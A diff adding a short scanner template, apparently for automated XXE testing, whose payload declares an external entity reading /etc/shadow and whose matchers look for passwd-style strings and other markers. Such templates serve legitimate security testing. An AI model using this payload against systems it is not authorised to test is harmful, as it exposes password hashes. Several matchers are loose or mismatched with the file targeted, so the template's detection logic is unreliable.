@@ -1,0 +1,25 @@
+id: xxe5-0357
+name: 'XXE read in root'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via root'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      root:
+        - '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><r>&xxe;</r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'root:'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
+          - 'PD9waHA'
